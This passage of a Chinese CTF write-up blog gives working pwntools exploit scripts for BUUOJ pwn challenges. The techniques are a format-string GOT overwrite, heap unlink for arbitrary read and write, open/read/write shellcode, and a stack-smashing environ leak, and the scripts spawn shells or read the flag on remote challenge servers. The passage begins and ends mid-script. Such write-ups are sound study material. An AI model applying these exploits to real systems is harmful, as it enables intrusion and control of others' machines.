punctuation\">)</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>sys_a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'/bin/sh\\0'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"wdb_2018_2nd_easyfmt\"><a class=\"markdownIt-Anchor\" href=\"#wdb_2018_2nd_easyfmt\">#</a> wdb_2018_2nd_easyfmt</h2>\n<p>fmt</p>\n<p>泄露 libc 地址，然后修改 printf_got 为 system。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> LibcSearcher</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'i386'</span><span class=\"token punctuation\">,</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>filename <span class=\"token operator\">=</span> <span class=\"token string\">'wdb_2018_2nd_easyfmt'</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>mode <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token number\">1</span> <span class=\"token keyword\">else</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">\"./\"</span><span class=\"token operator\">+</span>filename<span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">27983</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>e <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">if</span> mode<span class=\"token operator\">==</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> <span class=\"token string\">'b '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">suspend</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">if</span> mode <span class=\"token operator\">==</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>main_a <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'main'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>printf_g <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'printf'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>lsm_g <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>offset<span class=\"token operator\">=</span><span class=\"token number\">6</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'Do you know repeater?\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'%7$s'</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>lsm_g<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>lsm_a <span class=\"token operator\">=</span> u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'the true address of __libc_start_main is %#x'</span><span class=\"token operator\">%</span>lsm_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>obj <span class=\"token operator\">=</span> LibcSearcher<span class=\"token punctuation\">(</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">,</span>lsm_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>libcbase <span class=\"token operator\">=</span> lsm_a <span class=\"token operator\">-</span> obj<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>sys_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> obj<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>bs_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> obj<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'str_bin_sh'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'[+] system add: %#x'</span><span class=\"token operator\">%</span>sys_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>payload <span class=\"token operator\">=</span> fmtstr_payload<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">&#123;</span>printf_g<span class=\"token punctuation\">:</span>sys_a<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\n'</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'/bin/sh\\0'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>p<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"hitcontraining_bamboobox\"><a class=\"markdownIt-Anchor\" href=\"#hitcontraining_bamboobox\">#</a> hitcontraining_bamboobox</h2>\n<p>unlink, got</p>\n<p>构造 unlink 指向 itemlist，然后实现任意地址读写。注意每次写会自动在最后面添加 <code>'\\0'</code> ，所以需要调整以防出事。</p>\n<p>可能还能用 overlap，因为写入数量不限。其次也许可以通过修改最开始程序自己分配的 0x10 内储存的地址来实现 getshell，但由于填充 0 字符以及 printf 输出，导致泄露 heap 地址有些困难。</p>\n<p>其次 magic 是假的，flag 文件只放在了根目录。所以老实怎么来怎么来吧。</p>\n<pre><code>#!/usr/bin/python3\nfrom pwn import *\nfrom LibcSearcher import LibcSearcher\ncontext(arch='amd64', log_level='debug')\n\nfilename = 'bamboobox'\nlibcfile = '/home/walt/share/pwn/libc/libc6_2.23-0ubuntu10_amd64/libc/lib/x86_64-linux-gnu/libc-2.23.so'\nlibc = ELF(libcfile)\n\nmode = int(sys.argv[1]) if len(sys.argv)&gt;1 else 0\np = process('./'+filename+'_pe') if mode else remote('node4.buuoj.cn',26150)\ne = ELF('./'+filename+'_pe') if mode else ELF('./'+filename)\n\nif mode==2:\n    gdb.attach(p, 'b *0x400E42')\n    \ndef suspend():\n    if mode == 2:\n        pause()\n    else:\n        sleep(0.1)\n\ndef choose(x):\n    p.sendafter(b'Your choice:', str(x).encode())\n    \ndef mal(size, content=b'aaaa'):\n    choose(2)\n    p.sendafter(b'length of item name:', str(size).encode())\n    p.sendafter(b'name of item:', content)\ndef free(index):\n    choose(4)\n    p.sendafter(b'the index of item:', str(index).encode())\ndef edit(index, size, content):\n    choose(3)\n    p.sendafter(b'index of item:', str(index).encode())\n    p.sendafter(b'length of item name:', str(size).encode())\n    p.sendafter(b'name of the item:', content)\ndef dump():\n    choose(1)\n\n\narray = 0x6020c0\nc1 = array + 0x10*1 + 0x8\nmagic = 0x0400D49\nfree_g = e.got['free']\n\nmal(0x18)\nmal(0xa8)\nmal(0x98)\nmal(0x18) #3\n\npayload = p64(0) + p64(0xa1) + p64(c1 - 0x8*3) + p64(c1-0x8*2)\npayload = payload.ljust(0xa0,b'\\0') + p64(0xa0) + p32(0xa0)\nedit(1, len(payload), payload)\nfree(2)\n\npayload = p64(0x18) + p64(free_g) + p32(0xa8)\nedit(1, len(payload), payload)\ndump()\np.recvuntil(b'0 : ')\nfree_a = u64(p.recv(6)+b'\\0\\0')\n\nlibc = LibcSearcher('free', free_a)\nlibcbase = free_a - libc.dump('free')\nsys_a = libcbase + libc.dump('system')\n\nedit(3, 7, b'/bin/sh')\nedit(0, 7, p64(sys_a)[:-1])\nfree(3)\np.interactive()\n</code></pre>\n<h2 id=\"hitcontraining_unlink\"><a class=\"markdownIt-Anchor\" href=\"#hitcontraining_unlink\">#</a> hitcontraining_unlink</h2>\n<p>与上面 hitcontraining_bamboobox 是同一题</p>\n<h2 id=\"极客大挑战-2019not-bad\"><a class=\"markdownIt-Anchor\" href=\"#极客大挑战-2019not-bad\">#</a> [极客大挑战 2019] Not Bad</h2>\n<p>shellcode</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#p=process('./bad')</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">28542</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">#gdb.attach(p, 'b*0x0400A01')</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>jmprsp <span class=\"token operator\">=</span> <span class=\"token number\">0x0400A01</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>offset <span class=\"token operator\">=</span> <span class=\"token number\">0x020</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>shellcode <span class=\"token operator\">=</span> <span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>mov rsi, rsp</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>xor rdi, rdi</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>mov rdx, 0x400</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>xor rax, rax</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>syscall</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>jmp rsp</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>shellcode2 <span class=\"token operator\">=</span> <span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>lea rax, [rsp-0x30]</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>jmp rax</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>payload <span class=\"token operator\">=</span> asm<span class=\"token punctuation\">(</span>shellcode<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>payload <span class=\"token operator\">=</span> payload<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span>offset<span class=\"token operator\">+</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'a'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'flag\\0'</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>jmprsp<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> asm<span class=\"token punctuation\">(</span>shellcode2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>shellcode <span class=\"token operator\">=</span> <span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"30\"></td><td><pre>lea rdi, [rsp-0xd]</pre></td></tr><tr><td data-num=\"31\"></td><td><pre>mov rax, 2</pre></td></tr><tr><td data-num=\"32\"></td><td><pre>xor rdx, rdx</pre></td></tr><tr><td data-num=\"33\"></td><td><pre>xor rsi, rsi</pre></td></tr><tr><td data-num=\"34\"></td><td><pre>syscall</pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>mov rdi, 3</pre></td></tr><tr><td data-num=\"37\"></td><td><pre>lea rsi, [rsp + 0xff]</pre></td></tr><tr><td data-num=\"38\"></td><td><pre>mov rdx, 0x400</pre></td></tr><tr><td data-num=\"39\"></td><td><pre>xor rax, rax</pre></td></tr><tr><td data-num=\"40\"></td><td><pre>syscall</pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>mov rdi, 1</pre></td></tr><tr><td data-num=\"43\"></td><td><pre>mov rax, 1</pre></td></tr><tr><td data-num=\"44\"></td><td><pre>syscall</pre></td></tr><tr><td data-num=\"45\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>asm<span class=\"token punctuation\">(</span>shellcode<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"axb_2019_brop64\"><a class=\"markdownIt-Anchor\" href=\"#axb_2019_brop64\">#</a> axb_2019_brop64</h2>\n<h2 id=\"wdb2018_guess\"><a class=\"markdownIt-Anchor\" href=\"#wdb2018_guess\">#</a> **wdb2018_guess</h2>\n<p>fork, stack smashing</p>\n<p>这题创建了 3 个子程序，并且存在 canary 保护。由于不是无限 fork 子程序，所以不能使用传统的 fork 爆破。</p>\n<p>在 libc-2.23 版本中，stack smashing 报错时，会输出 environ 变量所指的文件名。而该变量储存在栈上。所以可以通过溢出将该变量覆盖为 ` 函数 got 表地址，以此在栈溢出报错时可以泄露 libc 地址。</p>\n<p>随后可以查找 libc 里的 <code>__environ</code>  变量，该变量储存着栈地址。</p>\n<p>最后，计算偏移，求出程序在栈上储存 flag 的地址。依法炮制，将 flag 输出。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> LibcSearcher</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>filename <span class=\"token operator\">=</span> <span class=\"token string\">'GUESS'</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>libcfile <span class=\"token operator\">=</span> <span class=\"token string\">'/home/walt/share/pwn/libc/libc6_2.23-0ubuntu10_amd64/libc/lib/x86_64-linux-gnu/libc-2.23.so'</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>libcfile<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>mode <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token number\">1</span> <span class=\"token keyword\">else</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">\"./\"</span><span class=\"token operator\">+</span>filename<span class=\"token operator\">+</span><span class=\"token string\">'_pe'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">28289</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>e <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token operator\">+</span><span class=\"token string\">'_pe'</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">if</span> mode<span class=\"token operator\">==</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> <span class=\"token string\">'b read'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">suspend</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">if</span> mode <span class=\"token operator\">==</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>main_a <span class=\"token operator\">=</span> <span class=\"token number\">0x400B0D</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>lsm_g <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>rdi <span class=\"token operator\">=</span> <span class=\"token number\">0x0400c13</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>rsi_r15 <span class=\"token operator\">=</span> <span class=\"token number\">0x0400c11</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>ret <span class=\"token operator\">=</span> <span class=\"token number\">0x0400791</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>environ <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffc91e90808</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>buf <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffc91e906e0</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>ind <span class=\"token operator\">=</span> environ<span class=\"token operator\">-</span>buf</pre></td></tr><tr><td data-num=\"33\"></td><td><pre>payload <span class=\"token operator\">=</span> ind <span class=\"token operator\">*</span> <span class=\"token string\">b'a'</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>lsm_g<span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b\"Please type your guessing flag\"</span><span class=\"token punctuation\">,</span> payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'***: '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>lsm_a <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b' '</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'the true address of __libc_start_main is %#x'</span><span class=\"token operator\">%</span>lsm_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>obj <span class=\"token operator\">=</span> LibcSearcher<span class=\"token punctuation\">(</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">,</span>lsm_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>libcbase <span class=\"token operator\">=</span> lsm_a <span class=\"token operator\">-</span> obj<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>evr <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> obj<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'__environ'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre></pre></td></tr><tr><td data-num=\"45\"></td><td><pre></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>payload <span class=\"token operator\">=</span> ind <span class=\"token operator\">*</span> <span class=\"token string\">b'a'</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>evr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b\"Please type your guessing flag\"</span><span class=\"token punctuation\">,</span> payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'***: '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>stackadd <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b' '</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>flag <span class=\"token operator\">=</span> stackadd 